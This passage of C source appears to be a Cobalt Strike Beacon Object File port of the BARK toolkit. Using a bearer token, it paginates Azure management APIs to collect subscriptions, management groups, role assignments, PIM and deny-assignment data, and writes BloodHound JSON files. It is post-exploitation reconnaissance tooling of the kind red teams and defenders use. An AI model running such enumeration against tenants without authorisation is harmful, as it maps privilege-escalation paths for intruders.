    BarkBufAppend(output, requestedScopes->buf, requestedScopes->len);
    BarkBufAppend(output, ",\"successfulScopes\":", 20);
    BarkBufAppend(output, successfulScopes->buf, successfulScopes->len);
    BarkBufAppend(output, ",\"failedScopes\":", 16);
    BarkBufAppend(output, failedScopes->buf, failedScopes->len);
    BarkBufAppend(output, "}}}", 3);
}

static char *BarkGetBHPageBufArm(LPCWSTR host, LPCWSTR widePath,
                                  const char *bearerToken, const char *kind,
                                  BarkBuf *b,
                                  int *alreadyEmitted, int *gotArrayShape,
                                  const char *tenantId, const char *rgField,
                                  int *pageSucceeded) {
    DWORD  status  = 0;
    char  *resp    = NULL;
    char  *nextUrl = NULL;

    if (pageSucceeded) *pageSucceeded = 0;
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BarkGetBH: header conversion failed\n");
        return NULL;
    }
    resp = HttpRequestWithRetry(L"GET", host, widePath, hdrWide, NULL, 0, &status);
    HFree(hdrWide);
    if (!resp) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkGetBH: request failed (HTTP %lu)\n", status);
        return NULL;
    }
    if (status >= 400) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkGetBH: HTTP %lu error:\n    %s\n", status, resp);
        HFree(resp);
        return NULL;
    }

    SIZE_T respLen = MSVCRT$strlen(resp);
    const char *end = resp + respLen;

    const char *vKey = JsonFindKey(resp, end, "\"value\"");
    if (vKey) {
        const char *bracket = JsonFindKey(vKey, end, ":");
        if (bracket) {
            bracket++;
            while (bracket < end &&
                   (*bracket == ' ' || *bracket == '\t' ||
                    *bracket == '\n' || *bracket == '\r'))
                bracket++;
            if (bracket < end && *bracket == '[') {
                const char *arrEnd = JsonSkipBalanced(bracket, end);
                if (arrEnd) {
                    *gotArrayShape = 1;
                    if (pageSucceeded) *pageSucceeded = 1;
                    int n = BarkBufEmitBHArrayBodyArm(
                        b, bracket + 1, arrEnd - 1, kind, *alreadyEmitted, tenantId, rgField);
                    *alreadyEmitted += n;
                    nextUrl = JsonExtractNextLink(resp, end);
                }
            }
        }
    }

    if (pageSucceeded && !*pageSucceeded) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkGetBH: successful HTTP response did not contain a valid value array\n");
    }

    HFree(resp);
    return nextUrl;
}

/* ARM-context variant of BarkGetBHAllSubscriptions.
 * Injects tenantId/subscriptionId/resourceGroupId per item. */
static void BarkGetBHAllSubscriptionsArmWithSnapshot(const char *bearerToken,
                                          const char *pathFmt,
                                          const char *kind,
                                          const char *tenantId,
                                          const char *rgField,
                                          const char *subscriptionSnapshot) {
    /* --- Phase 1: reuse the all-info snapshot when it is valid. --- */
    BarkIdList subs = BarkParseSubscriptionSnapshot(subscriptionSnapshot);
    int discoveryComplete = subs.count > 0;
    int subscriptionEnumerationComplete = 0;
    int fallbackEnumerationComplete = 0;

    if (subscriptionSnapshot &&
        MSVCRT$strcmp(subscriptionSnapshot, "__none__") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Reusing validated empty subscription snapshot for %s\n", kind);
        BarkEmitAllInfoArmMarker(kind);
        BarkIdListFree(&subs);
        return;
    }

    if (subs.count > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Reusing validated subscription snapshot (%d subscription(s))\n",
            subs.count);
    } else {
        if (subscriptionSnapshot && subscriptionSnapshot[0]) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] Invalid subscription snapshot; falling back to live discovery\n");
        }
        subs = BarkEnumEntityIdsWithStatus(
            L"management.azure.com",
            "/subscriptions?api-version=2020-01-01",
            bearerToken, "\"subscriptionId\"",
            &subscriptionEnumerationComplete);
        discoveryComplete = subscriptionEnumerationComplete;
    }

    if (subs.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] /subscriptions returned empty, trying management group fallback...\n");
        subs = BarkMgmtGroupFallbackGetSubscriptionIdsWithStatus(
            bearerToken, &fallbackEnumerationComplete);
        /* A failed primary request can never be upgraded to a complete tenant
         * inventory by the management-group fallback: standalone or
         * inaccessible subscriptions may not appear in that hierarchy. */
        discoveryComplete = subscriptionEnumerationComplete &&
                            fallbackEnumerationComplete;
    }
    if (subs.count == 0) {
        if (discoveryComplete) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] BarkGetBHAllSubscriptionsArm(%s): validated empty subscription snapshot\n",
                kind);
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] BarkGetBHAllSubscriptionsArm(%s): subscription discovery incomplete; empty result is not authoritative\n",
                kind);
        }
        BarkEmitAllInfoArmMarker(kind);
        BarkIdListFree(&subs);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Found %d subscription(s), enumerating %s across all...\n", subs.count, kind);

    /* Emit the snapshot only from the first ARM collector.  The CNA handler
     * stores these IDs in memory and appends them to later all-info BOFs. */
    if (kind && MSVCRT$strcmp(kind, "AZRoleDefinition") == 0) {
        int snapshotIndex;
        for (snapshotIndex = 0; snapshotIndex < subs.count; snapshotIndex++) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[BARK/v5] subscription snapshot: %s\n", subs.ids[snapshotIndex]);
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "[BARK/v5] subscription snapshot status: %s\n",
            discoveryComplete ? "complete" : "incomplete");
    }

    /* --- Phase 2: for each subscription, paginate through results --- */
    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBuf requestedScopes = { NULL, 0, 0, 1 };
    BarkBuf successfulScopes = { NULL, 0, 0, 1 };
    BarkBuf failedScopes = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);
    BarkBufAppend(&requestedScopes, "[", 1);
    BarkBufAppend(&successfulScopes, "[", 1);
    BarkBufAppend(&failedScopes, "[", 1);
    int emitted = 0;
    int requestedCount = 0;
    int successfulCount = 0;
    int failedCount = 0;
    int si;

    for (si = 0; si < subs.count; si++) {
        char pathBuf[2048];
        char collectionScope[128];
        int scopeComplete = 1;
        MSVCRT$sprintf_s(collectionScope, sizeof(collectionScope),
            "/subscriptions/%s", subs.ids[si]);
        BarkBufAppendScopeValue(&requestedScopes, &requestedCount,
            collectionScope);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), pathFmt, subs.ids[si]);
        LPWSTR widePath = MbsToWcs(pathBuf);
        if (!widePath) {
            BarkBufAppendScopeValue(&failedScopes, &failedCount,
                collectionScope);
            continue;
        }

        int isArray = 0;
        LPCWSTR pathArg = widePath;
        LPWSTR nextWide = NULL;
        char  *nextUrl  = NULL;

        while (1) {
            int pageSucceeded = 0;
            char *next = BarkGetBHPageBufArm(L"management.azure.com", pathArg,
                                              bearerToken, kind, &b, &emitted, &isArray, tenantId, rgField,
                                              &pageSucceeded);
            if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }
            if (!pageSucceeded) {
                scopeComplete = 0;
                if (next) HFree(next);
                break;
            }
            if (!next) break;
            char *np = next;
            if (MSVCRT$strncmp(np, "http://", 7) == 0)       np += 7;
            else if (MSVCRT$strncmp(np, "https://", 8) == 0)  np += 8;
            char *slash = MSVCRT$strstr(np, "/");
            nextWide = MbsToWcs(slash ? slash : next);
            nextUrl = next;
            if (!nextWide) {
                scopeComplete = 0;
                break;
            }
            pathArg = nextWide;
        }
        if (nextUrl) HFree(nextUrl);
        if (nextWide) HFree(nextWide);
        HFree(widePath);
        if (scopeComplete)
            BarkBufAppendScopeValue(&successfulScopes, &successfulCount,
                collectionScope);
        else
            BarkBufAppendScopeValue(&failedScopes, &failedCount,
                collectionScope);
    }

    /* --- Phase 3: write BH envelope to file --- */
    BarkBufAppendCollectionTail(&b, emitted, NULL,
        &requestedScopes, &successfulScopes, &failedScopes,
        requestedCount, successfulCount, failedCount, discoveryComplete);

    if (b.ok && b.buf) {
        SYSTEMTIME st;
        KERNEL32$GetLocalTime(&st);
        const char *kindShort = kind;
        if (kindShort[0] == 'A' && kindShort[1] == 'Z') kindShort += 2;
        char filename[300];
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZ%s_%04u%02u%02u_%02u%02u%02u.json",
            kindShort,
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BeaconPrintf(CALLBACK_OUTPUT,
                "[+] BARK %s found %d objects across %d subscription(s)\n",
                kind, emitted, subs.count);
        BarkWriteOutput(filename, b.buf, (DWORD)b.len);
    }
    BarkEmitAllInfoArmMarker(kind);
    BarkBufFree(&b);
    BarkBufFree(&requestedScopes);
    BarkBufFree(&successfulScopes);
    BarkBufFree(&failedScopes);
    BarkIdListFree(&subs);
}

/* Preserve standalone callers while allowing get_all_info to pass a
 * validated in-memory subscription snapshot. */
static void BarkGetBHAllSubscriptionsArm(const char *bearerToken,
                                          const char *pathFmt,
                                          const char *kind,
                                          const char *tenantId,
                                          const char *rgField) {
    BarkGetBHAllSubscriptionsArmWithSnapshot(bearerToken, pathFmt, kind,
        tenantId, rgField, NULL);
}

/* Collect authorization data that is not returned by the normal role
 * assignment endpoints.  Each call reuses the same validated subscription
 * snapshot, so this adds five resource-family passes without rediscovering
 * the subscription list five times. */
static void BarkGetBHAllManagementGroupAuthorizationExtras(
    const char *bearerToken, const char *tenantId, const char *singleGroupId);

static void BarkGetBHAllAuthorizationExtrasWithSnapshot(
    const char *bearerToken, const char *tenantId,
    const char *subscriptionSnapshot) {
    int noSubscriptions = subscriptionSnapshot &&
        MSVCRT$strcmp(subscriptionSnapshot, "__none__") == 0;
    if (!noSubscriptions) {
        BarkGetBHAllSubscriptionsArmWithSnapshot(
            bearerToken,
            "/subscriptions/%s/providers/Microsoft.Authorization/denyAssignments?api-version=2022-04-01",
            "AZDenyAssignment", tenantId, "resourceGroupId", subscriptionSnapshot);
        BarkGetBHAllSubscriptionsArmWithSnapshot(
            bearerToken,
            "/subscriptions/%s/providers/Microsoft.Authorization/roleEligibilityScheduleInstances?api-version=2020-10-01",
            "AZRoleEligibilityScheduleInstance", tenantId, "resourceGroupId", subscriptionSnapshot);
        BarkGetBHAllSubscriptionsArmWithSnapshot(
            bearerToken,
            "/subscriptions/%s/providers/Microsoft.Authorization/roleAssignmentScheduleInstances?api-version=2020-10-01",
            "AZRoleAssignmentScheduleInstance", tenantId, "resourceGroupId", subscriptionSnapshot);
        BarkGetBHAllSubscriptionsArmWithSnapshot(
            bearerToken,
            "/subscriptions/%s/providers/Microsoft.Authorization/roleManagementPolicyAssignments?api-version=2020-10-01",
            "AZRoleManagementPolicyAssignment", tenantId, "resourceGroupId", subscriptionSnapshot);
        BarkGetBHAllSubscriptionsArmWithSnapshot(
            bearerToken,
            "/subscriptions/%s/providers/Microsoft.Authorization/roleManagementPolicies?api-version=2020-10-01",
            "AZRoleManagementPolicy", tenantId, "resourceGroupId", subscriptionSnapshot);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] No subscriptions in validated snapshot; collecting management-group deny/PIM data only\n");
    }
    BarkGetBHAllManagementGroupAuthorizationExtras(bearerToken, tenantId, NULL);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[BARK/v5] all-info collector complete: arm_authorization_extras\n");
}

static void BarkGetBHAllAuthorizationExtras(const char *bearerToken,
                                             const char *tenantId) {
    BarkGetBHAllAuthorizationExtrasWithSnapshot(bearerToken, tenantId, NULL);
}

/* ARM-context variant of BarkGetBHInner for single-subscription mode.
 * Extracts tenantId/subscriptionId/resourceGroupId per item. */
static void BarkGetBHInnerArm(LPCWSTR host, LPCWSTR widePath,
                               const char *bearerToken, const char *kind,
                               const char *tenantId, const char *rgField) {
    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);

    int    emitted    = 0;
    int    isArray    = 0;
    char  *currentUrl = NULL;
    LPWSTR pathWide   = NULL;
    LPCWSTR pathArg   = widePath;

    while (1) {
        int pageSucceeded = 0;
        char *next = BarkGetBHPageBufArm(host, pathArg, bearerToken, kind,
                                          &b, &emitted, &isArray, tenantId, rgField,
                                          &pageSucceeded);
        if (currentUrl) { HFree(currentUrl); currentUrl = NULL; }
        if (pathWide)   { HFree(pathWide);   pathWide   = NULL; }
        if (!pageSucceeded) {
            if (next) HFree(next);
            break;
        }
        if (!next) break;
        char *p = next;
        if (MSVCRT$strncmp(p, "http://", 7) == 0)        p += 7;
        else if (MSVCRT$strncmp(p, "https://", 8) == 0)  p += 8;
        char *slash = MSVCRT$strstr(p, "/");
        const char *pathStart = slash ? slash : next;
        pathWide = MbsToWcs(pathStart);
        currentUrl = next;
        if (!pathWide) break;
        pathArg = pathWide;
    }

    char tail[128];
    int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}", emitted);
    if (tailLen > 0) BarkBufAppend(&b, tail, (SIZE_T)tailLen);

    if (!b.ok || !b.buf) {
        BarkEmitAllInfoArmMarker(kind);
        BarkBufFree(&b);
        return;
    }

    SYSTEMTIME st;
    KERNEL32$GetLocalTime(&st);
    const char *kindShort = kind;
    if (kindShort[0] == 'A' && kindShort[1] == 'Z') kindShort += 2;
    char filename[300];
    MSVCRT$sprintf_s(filename, sizeof(filename),
        ".\\AZ%s_%04u%02u%02u_%02u%02u%02u.json",
        kindShort,
        (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
        (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
    BeaconPrintf(CALLBACK_OUTPUT,
            "[+] BARK %s found %d objects\n",
            kind, emitted);
    BarkWriteOutput(filename, b.buf, (DWORD)b.len);
    BarkEmitAllInfoArmMarker(kind);
    BarkBufFree(&b);
}

/* Collect role assignments authored directly at management-group scopes.
 * Subscription RBAC collection cannot discover grants authored above the
 * subscription, so the permission analyzer needs this separate snapshot.
 * The list is paginated and every page is passed through the common retry and
 * Retry-After-aware HTTP path. */
static void BarkGetBHAllManagementGroupRoleAssignments(
    const char *bearerToken, const char *tenantId, const char *singleGroupId) {
    BarkIdList groups;
    BarkBuf output = { NULL, 0, 0, 1 };
    BarkBuf descendantOutput = { NULL, 0, 0, 1 };
    BarkBuf managementGroupOutput = { NULL, 0, 0, 1 };
    BarkBuf roleDefinitionOutput = { NULL, 0, 0, 1 };
    BarkBuf roleRequested = { NULL, 0, 0, 1 };
    BarkBuf roleSuccessful = { NULL, 0, 0, 1 };
    BarkBuf roleFailed = { NULL, 0, 0, 1 };
    BarkBuf descendantRequested = { NULL, 0, 0, 1 };
    BarkBuf descendantSuccessful = { NULL, 0, 0, 1 };
    BarkBuf descendantFailed = { NULL, 0, 0, 1 };
    BarkBuf definitionRequested = { NULL, 0, 0, 1 };
    BarkBuf definitionSuccessful = { NULL, 0, 0, 1 };
    BarkBuf definitionFailed = { NULL, 0, 0, 1 };
    int emitted = 0;
    int descendantsEmitted = 0;
    int managementGroupsEmitted = 0;
    int roleDefinitionsEmitted = 0;
    int roleRequestedCount = 0, roleSuccessfulCount = 0, roleFailedCount = 0;
    int descendantRequestedCount = 0, descendantSuccessfulCount = 0,
        descendantFailedCount = 0;
    int definitionRequestedCount = 0, definitionSuccessfulCount = 0,
        definitionFailedCount = 0;
    int groupEnumerationComplete = 0;
    int gi;

    BarkIdListInit(&groups);
    if (singleGroupId && singleGroupId[0]) {
        SIZE_T length = MSVCRT$strlen(singleGroupId) + 1;
        char *copy = (char *)HAlloc(length);
        if (copy) {
            MSVCRT$memcpy(copy, singleGroupId, length);
            BarkIdListAppend(&groups, copy);
            groupEnumerationComplete = 1;
        }
    } else {
        groups = BarkEnumEntityIdsWithStatus(
            L"management.azure.com",
            "/providers/Microsoft.Management/managementGroups?api-version=2020-05-01",
            bearerToken, "\"name\"", &groupEnumerationComplete);
    }

    BarkBufAppend(&output, "{\"data\":[", 9);
    BarkBufAppend(&descendantOutput, "{\"data\":[", 9);
    BarkBufAppend(&managementGroupOutput, "{\"data\":[", 9);
    BarkBufAppend(&roleDefinitionOutput, "{\"data\":[", 9);
    BarkBufAppend(&roleRequested, "[", 1);
    BarkBufAppend(&roleSuccessful, "[", 1);
    BarkBufAppend(&roleFailed, "[", 1);
    BarkBufAppend(&descendantRequested, "[", 1);
    BarkBufAppend(&descendantSuccessful, "[", 1);
    BarkBufAppend(&descendantFailed, "[", 1);
    BarkBufAppend(&definitionRequested, "[", 1);
    BarkBufAppend(&definitionSuccessful, "[", 1);
    BarkBufAppend(&definitionFailed, "[", 1);

    if (!groupEnumerationComplete) {
        const char *rootScope =
            "/providers/Microsoft.Management/managementGroups";
        BarkBufAppendScopeValue(&roleRequested, &roleRequestedCount, rootScope);
        BarkBufAppendScopeValue(&roleFailed, &roleFailedCount, rootScope);
        BarkBufAppendScopeValue(&descendantRequested,
            &descendantRequestedCount, rootScope);
        BarkBufAppendScopeValue(&descendantFailed,
            &descendantFailedCount, rootScope);
        BarkBufAppendScopeValue(&definitionRequested,
            &definitionRequestedCount, rootScope);
        BarkBufAppendScopeValue(&definitionFailed,
            &definitionFailedCount, rootScope);
    }

    /* Emit concrete management-group entities so relationship targets do not
     * become anonymous AZBase placeholders in BloodHound.  The list endpoint
     * has already supplied the canonical group names, so this costs no extra
     * request and remains usable when the tenant has no subscriptions. */
    for (gi = 0; gi < groups.count; gi++) {
        char managementGroupScope[1024];
        char tenantUpper[128];
        const char *prefix =
            "{\"kind\":\"AZManagementGroup\",\"data\":{\"id\":";
        BarkBuildManagementGroupScope(groups.ids[gi], managementGroupScope,
            sizeof(managementGroupScope));
        MSVCRT$sprintf_s(tenantUpper, sizeof(tenantUpper), "%s",
            tenantId ? tenantId : "");
        BarkUppercaseAsciiInPlace(tenantUpper);
        if (managementGroupsEmitted > 0)
            BarkBufAppend(&managementGroupOutput, ",", 1);
        BarkBufAppend(&managementGroupOutput, prefix, MSVCRT$strlen(prefix));
        BarkBufAppendJsonQuoted(&managementGroupOutput, managementGroupScope);
        BarkBufAppend(&managementGroupOutput, ",\"name\":", 8);
        BarkBufAppendJsonQuoted(&managementGroupOutput, groups.ids[gi]);
        BarkBufAppend(&managementGroupOutput,
            ",\"type\":\"Microsoft.Management/managementGroups\","
            "\"properties\":{\"displayName\":",
            MSVCRT$strlen(
                ",\"type\":\"Microsoft.Management/managementGroups\","
                "\"properties\":{\"displayName\":"));
        BarkBufAppendJsonQuoted(&managementGroupOutput, groups.ids[gi]);
        BarkBufAppend(&managementGroupOutput, ",\"tenantId\":", 12);
        BarkBufAppendJsonQuoted(&managementGroupOutput, tenantUpper);
        BarkBufAppend(&managementGroupOutput, "},\"tenantId\":", 13);
        BarkBufAppendJsonQuoted(&managementGroupOutput, tenantUpper);
        BarkBufAppend(&managementGroupOutput, "}}", 2);
        managementGroupsEmitted++;
    }

    for (gi = 0; gi < groups.count; gi++) {
        char pathBuf[2048];
        char managementGroupScope[1024];
        LPWSTR widePath;
        int isArray = 0;
        int scopeComplete = 1;
        LPCWSTR pathArg;
        LPWSTR nextWide = NULL;
        char *nextUrl = NULL;

        BarkBuildManagementGroupScope(groups.ids[gi], managementGroupScope,
            sizeof(managementGroupScope));
        BarkBufAppendScopeValue(&roleRequested, &roleRequestedCount,
            managementGroupScope);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/providers/Microsoft.Management/managementGroups/%s/providers/"
            "Microsoft.Authorization/roleAssignments?api-version=2022-04-01&"
            "$filter=atScope()", groups.ids[gi]);
        widePath = MbsToWcs(pathBuf);
        if (!widePath) {
            BarkBufAppendScopeValue(&roleFailed, &roleFailedCount,
                managementGroupScope);
            continue;
        }
        pathArg = widePath;
        while (1) {
            BarkBuf page = { NULL, 0, 0, 1 };
            int pageEmitted = 0;
            int pageCopied = 0;
            int pageSucceeded = 0;
            char *next = BarkGetBHPageBufArm(
                L"management.azure.com", pathArg, bearerToken,
                "AZManagementGroupRoleAssignment", &page, &pageEmitted,
                &isArray, tenantId, "resourceGroupId", &pageSucceeded);
            if (page.ok && page.buf && pageEmitted > 0) {
                const char *cursor = page.buf;
                const char *pageEnd = page.buf + page.len;
                while (cursor < pageEnd) {
                    const char *dataKey = MSVCRT$strstr(cursor, "\"data\"");
                    if (!dataKey || dataKey >= pageEnd) break;
                    const char *colon = MSVCRT$strstr(dataKey, ":");
                    if (!colon || colon >= pageEnd) break;
                    colon++;
                    while (colon < pageEnd && (*colon == ' ' || *colon == '\t' ||
                           *colon == '\n' || *colon == '\r')) colon++;
                    if (colon >= pageEnd || *colon != '{') break;
                    const char *rawEnd = JsonSkipBalanced(colon, pageEnd);
                    if (!rawEnd) break;
                    char prefix[512];
                    int prefixLen = MSVCRT$sprintf_s(prefix, sizeof(prefix),
                        "%s{\"kind\":\"AZManagementGroupRoleAssignment\","
                        "\"data\":{\"roleAssignments\":[{\"roleAssignment\":",
                        emitted > 0 ? "," : "");
                    if (prefixLen > 0) BarkBufAppend(&output, prefix, (SIZE_T)prefixLen);
                    BarkBufAppend(&output, colon, (SIZE_T)(rawEnd - colon));
                    const char *middle = ",\"managementGroupId\":";
                    const char *outer = "}],\"managementGroupId\":";
                    BarkBufAppend(&output, middle, MSVCRT$strlen(middle));
                    BarkBufAppendJsonQuoted(&output, managementGroupScope);
                    BarkBufAppend(&output, outer, MSVCRT$strlen(outer));
                    BarkBufAppendJsonQuoted(&output, managementGroupScope);
                    BarkBufAppend(&output, "}}", 2);
                    emitted++;
                    pageCopied++;
                    cursor = rawEnd;
                }
            }
            BarkBufFree(&page);
            if (nextUrl) { HFree(nextUrl); nextUrl = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }
            if (!pageSucceeded || pageCopied != pageEmitted) {
                scopeComplete = 0;
                if (next) HFree(next);
                break;
            }
            if (!next) break;
            nextWide = BarkResolveNextLink(next,
                L"management.azure.com", "");
            nextUrl = next;
            if (!nextWide) {
                scopeComplete = 0;
                break;
            }
            pathArg = nextWide;
        }
        if (nextUrl) HFree(nextUrl);
        if (nextWide) HFree(nextWide);
        HFree(widePath);
        if (scopeComplete)
            BarkBufAppendScopeValue(&roleSuccessful, &roleSuccessfulCount,
                managementGroupScope);
        else
            BarkBufAppendScopeValue(&roleFailed, &roleFailedCount,
                managementGroupScope);
    }

    /* The descendant map is required to propagate management-group grants to
     * subscriptions and resources.  Reuse the already enumerated management
     * group list so this adds one paginated request per group, not another
     * parent-list discovery pass. */
    for (gi = 0; gi < groups.count; gi++) {
        char descendantPathBuf[2048];
        char managementGroupScope[1024];
        LPWSTR descendantWidePath;
        LPCWSTR descendantPathArg;
        LPWSTR descendantNextWide = NULL;
        char *descendantNextUrl = NULL;
        int descendantIsArray = 0;
        int scopeComplete = 1;

        BarkBuildManagementGroupScope(groups.ids[gi], managementGroupScope,
            sizeof(managementGroupScope));
        BarkBufAppendScopeValue(&descendantRequested,
            &descendantRequestedCount, managementGroupScope);
        MSVCRT$sprintf_s(descendantPathBuf, sizeof(descendantPathBuf),
            "/providers/Microsoft.Management/managementGroups/%s/descendants?"
            "api-version=2020-05-01", groups.ids[gi]);
        descendantWidePath = MbsToWcs(descendantPathBuf);
        if (!descendantWidePath) {
            BarkBufAppendScopeValue(&descendantFailed,
                &descendantFailedCount, managementGroupScope);
            continue;
        }
        descendantPathArg = descendantWidePath;
        while (1) {
            int pageSucceeded = 0;
            char *next = BarkGetBHPageBufArm(
                L"management.azure.com", descendantPathArg, bearerToken,
                "AZManagementGroupDescendant", &descendantOutput,
                &descendantsEmitted, &descendantIsArray, tenantId,
                "resourceGroupId", &pageSucceeded);
            if (descendantNextUrl) {
                HFree(descendantNextUrl);
                descendantNextUrl = NULL;
            }
            if (descendantNextWide) {
                HFree(descendantNextWide);
                descendantNextWide = NULL;
            }
            if (!pageSucceeded) {
                scopeComplete = 0;
                if (next) HFree(next);
                break;
            }
            if (!next) break;
            descendantNextWide = BarkResolveNextLink(
                next, L"management.azure.com", "");
            descendantNextUrl = next;
            if (!descendantNextWide) {
                scopeComplete = 0;
                break;
            }
            descendantPathArg = descendantNextWide;
        }
        if (descendantNextUrl) HFree(descendantNextUrl);
        if (descendantNextWide) HFree(descendantNextWide);
        HFree(descendantWidePath);
        if (scopeComplete)
            BarkBufAppendScopeValue(&descendantSuccessful,
                &descendantSuccessfulCount, managementGroupScope);
        else
            BarkBufAppendScopeValue(&descendantFailed,
                &descendantFailedCount, managementGroupScope);
    }

    /* Role definitions are also required at management-group scope when no
     * subscription is visible; otherwise custom management-group roles cannot
     * be resolved by the permission-analysis layer. */
    for (gi = 0; gi < groups.count; gi++) {
        char definitionPathBuf[2048];
        char managementGroupScope[1024];
        LPWSTR definitionWidePath;
        LPCWSTR definitionPathArg;
        LPWSTR definitionNextWide = NULL;
        char *definitionNextUrl = NULL;
        int definitionIsArray = 0;
        int scopeComplete = 1;

        BarkBuildManagementGroupScope(groups.ids[gi], managementGroupScope,
            sizeof(managementGroupScope));
        BarkBufAppendScopeValue(&definitionRequested,
            &definitionRequestedCount, managementGroupScope);
        MSVCRT$sprintf_s(definitionPathBuf, sizeof(definitionPathBuf),
            "/providers/Microsoft.Management/managementGroups/%s/providers/"
            "Microsoft.Authorization/roleDefinitions?api-version=2022-04-01",
            groups.ids[gi]);
        definitionWidePath = MbsToWcs(definitionPathBuf);
        if (!definitionWidePath) {
            BarkBufAppendScopeValue(&definitionFailed,
                &definitionFailedCount, managementGroupScope);
            continue;
        }
        definitionPathArg = definitionWidePath;
        while (1) {
            int pageSucceeded = 0;
            char *next = BarkGetBHPageBufArm(
                L"management.azure.com", definitionPathArg, bearerToken,
                "AZRoleDefinition", &roleDefinitionOutput,
                &roleDefinitionsEmitted, &definitionIsArray, tenantId,
                "resourceGroupId", &pageSucceeded);
            if (definitionNextUrl) {
                HFree(definitionNextUrl);
                definitionNextUrl = NULL;
            }
            if (definitionNextWide) {
                HFree(definitionNextWide);
                definitionNextWide = NULL;
            }
            if (!pageSucceeded) {
                scopeComplete = 0;
                if (next) HFree(next);
                break;
            }
            if (!next) break;
            definitionNextWide = BarkResolveNextLink(next,
                L"management.azure.com", "");
            definitionNextUrl = next;
            if (!definitionNextWide) {
                scopeComplete = 0;
                break;
            }
            definitionPathArg = definitionNextWide;
        }
        if (definitionNextUrl) HFree(definitionNextUrl);
        if (definitionNextWide) HFree(definitionNextWide);
        HFree(definitionWidePath);
        if (scopeComplete)
            BarkBufAppendScopeValue(&definitionSuccessful,
                &definitionSuccessfulCount, managementGroupScope);
        else
            BarkBufAppendScopeValue(&definitionFailed,
                &definitionFailedCount, managementGroupScope);
    }

    BarkBufAppendCollectionTail(&descendantOutput, descendantsEmitted,
        "management-group", &descendantRequested, &descendantSuccessful,
        &descendantFailed, descendantRequestedCount,
        descendantSuccessfulCount, descendantFailedCount,
        groupEnumerationComplete);
    BarkBufAppendCollectionTail(&roleDefinitionOutput, roleDefinitionsEmitted,
        "management-group", &definitionRequested, &definitionSuccessful,
        &definitionFailed, definitionRequestedCount,
        definitionSuccessfulCount, definitionFailedCount,
        groupEnumerationComplete);
    {
        char managementGroupTail[128];
        int managementGroupTailLength = MSVCRT$sprintf_s(
            managementGroupTail, sizeof(managementGroupTail),
            "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}",
            managementGroupsEmitted);
        if (managementGroupTailLength > 0)
            BarkBufAppend(&managementGroupOutput, managementGroupTail,
                (SIZE_T)managementGroupTailLength);
    }
    if (descendantOutput.ok && descendantOutput.buf) {
        SYSTEMTIME st;
        char descendantFilename[300];
        KERNEL32$GetLocalTime(&st);
        MSVCRT$sprintf_s(descendantFilename, sizeof(descendantFilename),
            ".\\AZManagementGroupDescendant_%04u%02u%02u_%02u%02u%02u.json",
            (unsigned)st.wYear, (unsigned)st.wMonth,
            (unsigned)st.wDay, (unsigned)st.wHour,
            (unsigned)st.wMinute, (unsigned)st.wSecond);
        BarkWriteOutput(descendantFilename, descendantOutput.buf,
            (DWORD)descendantOutput.len);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] BARK AZManagementGroupDescendant found %d objects across %d management group(s)\n",
            descendantsEmitted, groups.count);
    }

    if (managementGroupOutput.ok && managementGroupOutput.buf) {
        SYSTEMTIME st;
        char managementGroupFilename[300];
        KERNEL32$GetLocalTime(&st);
        MSVCRT$sprintf_s(managementGroupFilename,
            sizeof(managementGroupFilename),
            ".\\AZManagementGroup_%04u%02u%02u_%02u%02u%02u.json",
            (unsigned)st.wYear, (unsigned)st.wMonth,
            (unsigned)st.wDay, (unsigned)st.wHour,
            (unsigned)st.wMinute, (unsigned)st.wSecond);
        BarkWriteOutput(managementGroupFilename, managementGroupOutput.buf,
            (DWORD)managementGroupOutput.len);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] BARK AZManagementGroup found %d objects\n",
            managementGroupsEmitted);
    }

    if (roleDefinitionOutput.ok && roleDefinitionOutput.buf) {
        SYSTEMTIME st;
        char roleDefinitionFilename[300];
        KERNEL32$GetLocalTime(&st);
        MSVCRT$sprintf_s(roleDefinitionFilename,
            sizeof(roleDefinitionFilename),
            ".\\AZRoleDefinitionManagementGroup_%04u%02u%02u_%02u%02u%02u.json",
            (unsigned)st.wYear, (unsigned)st.wMonth,
            (unsigned)st.wDay, (unsigned)st.wHour,
            (unsigned)st.wMinute, (unsigned)st.wSecond);
        BarkWriteOutput(roleDefinitionFilename, roleDefinitionOutput.buf,
            (DWORD)roleDefinitionOutput.len);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] BARK AZRoleDefinition found %d objects across %d management group(s)\n",
